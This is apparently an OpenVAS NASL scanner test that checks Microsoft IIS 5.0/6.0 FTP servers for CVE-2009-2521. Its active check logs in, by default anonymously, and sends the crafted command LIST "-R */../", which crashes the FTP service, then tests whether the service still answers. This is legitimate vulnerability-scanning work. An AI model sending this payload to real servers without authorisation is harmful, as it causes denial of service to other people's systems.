###############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_ms_iis_ftpd_ls_dos_vuln.nasl 9350 2018-04-06 07:03:33Z cfischer $
#
# Microsoft IIS FTP Server 'ls' Command DOS Vulnerability
#
# Authors:
# Nikita MR <rnikita@secpod.com>
#
# Copyright:
# Copyright (c) 2009 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_impact = "Successful exploitation will allows remote authenticated users to crash the
  application leading to denial of service condition.
  Impact Level: Application";
tag_affected = "Microsoft Internet Information Services version 5.0 and 6.0";
tag_insight = "A stack consumption error occurs in the FTP server while processing crafted
  LIST command containing a wildcard that references a subdirectory followed by
  a .. (dot dot).";
tag_solution = "Upgrade to IIS version 7.5
  http://www.iis.net/";
tag_summary = "The host is running Microsoft IIS with FTP server and
  is prone to Denial of Service vulnerability.";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.900944");
  script_version("$Revision: 9350 $");
  script_tag(name:"last_modification", value:"$Date: 2018-04-06 09:03:33 +0200 (Fri, 06 Apr 2018) $");
  script_tag(name:"creation_date", value:"2009-09-18 08:01:03 +0200 (Fri, 18 Sep 2009)");
  script_tag(name:"cvss_base", value:"2.6");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:H/Au:N/C:N/I:N/A:P");
  script_cve_id("CVE-2009-2521");
  script_bugtraq_id(36273);
  script_name("Microsoft IIS FTP Server 'ls' Command DOS Vulnerability");
  script_xref(name : "URL" , value : "http://www.microsoft.com/technet/security/advisory/975191.mspx");
  script_xref(name : "URL" , value : "http://archives.neohapsis.com/archives/fulldisclosure/2009-09/0040.html");
  script_xref(name : "URL" , value : "http://blogs.technet.com/msrc/archive/2009/09/01/microsoft-security-advisory-975191-released.aspx");
  script_xref(name : "URL" , value : "http://blogs.technet.com/msrc/archive/2009/09/03/microsoft-security-advisory-975191-revised.aspx");

  script_category(ACT_DENIAL);
  script_copyright("Copyright (C) 2009 SecPod");
  script_family("Denial of Service");
  script_dependencies("secpod_ftp_anonymous.nasl");
  script_require_ports("Services/ftp", 21);
  script_tag(name : "impact" , value : tag_impact);
  script_tag(name : "affected" , value : tag_affected);
  script_tag(name : "insight" , value : tag_insight);
  script_tag(name : "solution" , value : tag_solution);
  script_tag(name : "summary" , value : tag_summary);
  script_tag(name:"qod_type", value:"registry");
  script_tag(name:"solution_type", value:"VendorFix");
  exit(0);
}


include("ftp_func.inc");
include("version_func.inc");

ftpPort = get_kb_item("Services/ftp");
if(!ftpPort){
  ftpPort = 21;
}

if(!get_port_state(ftpPort)) {
  exit(0);
}

banner = get_ftp_banner(port:ftpPort);
if("Microsoft FTP Service" >!< banner) {
  exit(0);
}

if(!safe_checks())
{
  soc = open_sock_tcp(ftpPort);
  if(!soc) {
    exit(0);
  }

  login = get_kb_item("ftp/login");
  if(!login){
    login = "anonymous";
  }
  pass = get_kb_item("ftp/password");
  if(!pass){
    pass = "anonymous";
  }

  if(ftp_authenticate(socket:soc, user: login, pass: pass))
  {
    cmd = 'LIST "-R */../"\r\n';	# The IIS server crashes and restarted.
    send(socket:soc, data:cmd);
    sleep(10);
    buff = recv(socket:soc, length:1024);

    ecmd = 'LIST\r\n';
    send(socket:soc, data:ecmd);
    eresp = recv(socket:soc, length:1024);
    if("Can't open data connection" >< eresp){
      security_message(ftpPort);
    }
  }
  close(soc);
}
